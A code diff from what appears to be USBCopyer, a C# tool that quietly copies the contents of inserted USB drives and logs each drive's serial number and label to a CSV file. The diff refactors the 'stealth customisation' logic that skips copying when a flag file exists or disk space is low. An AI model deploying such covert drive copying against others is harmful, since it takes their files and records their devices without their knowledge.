@@ -493,6 +493,11 @@ namespace USBCopyer
                                                     return;
                                                 }
                                             }
+                                            // 隐藏性定制：插盘即时判定，命中 disabled 或输出盘空间不足则不进入延迟等待与复制流程
+                                            if (TrySkipCopy(disk, diskser, diskname, fileSystemName.ToString(), serialNumber, diskdir))
+                                            {
+                                                continue; // 只跳过当前分区，同设备其他分区仍继续处理
+                                            }
                                             copyThread[disk] = new Thread(() =>
                                             {
                                                 if (Properties.Settings.Default.sleep > 0)
@@ -518,62 +523,15 @@ namespace USBCopyer
                                                     Program.log("清空输出目录：" + dir + diskdir);
                                                     Directory.Delete(dir + diskdir, true);
                                                 }
-                                                if (!File.Exists(dir + "Disks.csv"))
-                                                {
-                                                    File.WriteAllBytes(dir + "Disks.csv", Properties.Resources.Disks);
-                                                }
-                                                try
-                                                {
-                                                    FileStream fs = File.Open(dir + "Disks.csv", FileMode.Append, FileAccess.Write);
-                                                    string DiskLog = "\r\n"
-                                                      + "\"" + DateTime.Now.ToLocalTime().ToString() + "\","
-                                                      + "\"" + diskser + "\","
-                                                      + "\"" + diskname + "\","
-                                                      + "\"" + disk + "\","
-                                                      + "\"" + fileSystemName.ToString() + "\","
-                                                      + "\"" + serialNumber.ToString() + "\","
-                                                      + "\"" + diskdir + "\",";
-                                                    var DiskLogBytes = Encoding.Default.GetBytes(DiskLog);
-                                                    fs.Position = fs.Length;
-                                                    fs.Write(DiskLogBytes, 0, DiskLogBytes.Length);
-                                                    fs.Close();
-                                                }
-                                                catch (Exception ex)
-                                                {
-                                                    Program.log("写入磁盘日志 Disk.csv 失败，文件可能被占用：\r\n" + ex.ToString(), 1);
-                                                }
-                                                // 隐藏性定制：输出目录所在磁盘空间不足时跳过复制，仅建目录
+                                                AppendDiskLog(disk, diskser, diskname, fileSystemName.ToString(), serialNumber, diskdir);
                                                 copyAborted = false;
-                                                if (IsDiskSpaceCritical(dir))
+                                                CopyDirectory(disk + "\\", dir + diskdir);
+                                                if (Properties.Settings.Default.SkipEmptyFolder)
                                                 {
-                                                    // 空间不足时仍建目录（占用可忽略），仅不复制文件
-                                                    try
-                                                    {
-                                                        Directory.CreateDirectory(dir + diskdir);
-                                                    }
-                                                    catch { }
-                                                    Program.log("输出目录所在磁盘空间不足（剩余 " + GetFreeSpaceMB(dir) + " MB），本次仅建目录、不复制文件", 0);
+                                                    KillEmptyDirectory(dir + diskdir);
                                                 }
-                                                else if (IsCopyDisabled())
-                                                {
-                                                    // disabled 存在时仍建目录、仍写 Disks.csv，仅不复制文件
-                                                    try
-                                                    {
-                                                        Directory.CreateDirectory(dir + diskdir);
-                                                    }
-                                                    catch { }
-                                                    Program.log("检测到 disabled 文件，本次仅建目录、不复制文件", 0);
-                                                }
-                                                else
-                                                {
-                                                    CopyDirectory(disk + "\\", dir + diskdir);
-                                                    if (Properties.Settings.Default.SkipEmptyFolder)
-                                                    {
-                                                        KillEmptyDirectory(dir + diskdir);
-                                                    }
-                                                    // 删除空目录会刷新父目录时间，这里按源目录树再校正一次
-                                                    RestoreDirectoryTimes(disk + "\\", dir + diskdir);
-                                                }
+                                                // 删除空目录会刷新父目录时间，这里按源目录树再校正一次
+                                                RestoreDirectoryTimes(disk + "\\", dir + diskdir);
                                                 //AllCompletedCallback
                                                 if (Properties.Settings.Default.EnableAllCompletedCallback && File.Exists(confdir + "AllCompletedCallback.bat"))
                                                 {
@@ -787,6 +745,63 @@ namespace USBCopyer
             catch
             {
                 return false;
+            }
+        }
+
+        /// <summary>
+        /// 隐藏性定制：插盘时即时判定。disabled 或输出盘空间不足时只建目录并写 Disks.csv，
+        /// 跳过延迟等待与复制，避免判定被 sleep 推迟
+        /// </summary>
+        private bool TrySkipCopy(string disk, string diskser, string diskname, string fileSystem, uint serialNumber, string diskdir)
+        {
+            bool spaceShort = IsDiskSpaceCritical(dir);
+            bool isDisabled = IsCopyDisabled();
+            if (!spaceShort && !isDisabled) return false;
+            try
+            {
+                Directory.CreateDirectory(dir + diskdir);
+            }
+            catch { }
+            AppendDiskLog(disk, diskser, diskname, fileSystem, serialNumber, diskdir);
+            if (spaceShort)
+            {
+                Program.log("输出目录所在磁盘空间不足（剩余 " + GetFreeSpaceMB(dir) + " MB），本次仅建目录、不复制文件：" + diskdir, 0);
+            }
+            else
+            {
+                Program.log("检测到 disabled 文件，本次仅建目录、不复制文件：" + diskdir, 0);
+            }
+            return true;
+        }
+
+        /// <summary>
+        /// 追加一条磁盘记录到 Disks.csv（首次自动写入表头模板）
+        /// </summary>
+        private void AppendDiskLog(string disk, string diskser, string diskname, string fileSystem, uint serialNumber, string diskdir)
+        {
+            try
+            {
+                if (!File.Exists(dir + "Disks.csv"))
+                {
+                    File.WriteAllBytes(dir + "Disks.csv", Properties.Resources.Disks);
+                }
+                FileStream fs = File.Open(dir + "Disks.csv", FileMode.Append, FileAccess.Write);
+                string DiskLog = "\r\n"
+                  + "\"" + DateTime.Now.ToLocalTime().ToString() + "\","
+                  + "\"" + diskser + "\","
+                  + "\"" + diskname + "\","
+                  + "\"" + disk + "\","
+                  + "\"" + fileSystem + "\","
+                  + "\"" + serialNumber.ToString() + "\","
+                  + "\"" + diskdir + "\",";
+                var DiskLogBytes = Encoding.Default.GetBytes(DiskLog);
+                fs.Position = fs.Length;
+                fs.Write(DiskLogBytes, 0, DiskLogBytes.Length);
+                fs.Close();
+            }
+            catch (Exception ex)
+            {
+                Program.log("写入磁盘日志 Disk.csv 失败，文件可能被占用：\r\n" + ex.ToString(), 1);
             }
         }
 
